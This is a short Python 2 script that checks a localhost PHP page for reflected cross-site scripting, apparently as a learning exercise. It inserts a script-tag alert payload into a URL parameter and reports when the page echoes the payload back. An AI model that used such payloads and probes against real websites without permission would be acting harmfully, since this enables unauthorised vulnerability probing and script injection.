"""
Project: xss
Pyton Version: Python 2.7.14
Author: canokay
"""
import requests
payload="<script>alert('cyberege')</script>"
url="http://localhost/xss/example1.php?name=root"
indis=url.find("=")
url=url[:indis+1]+payload
print url
sonuc=requests.get(url)
if payload in sonuc.content:
    print "[+]XSS vardir"
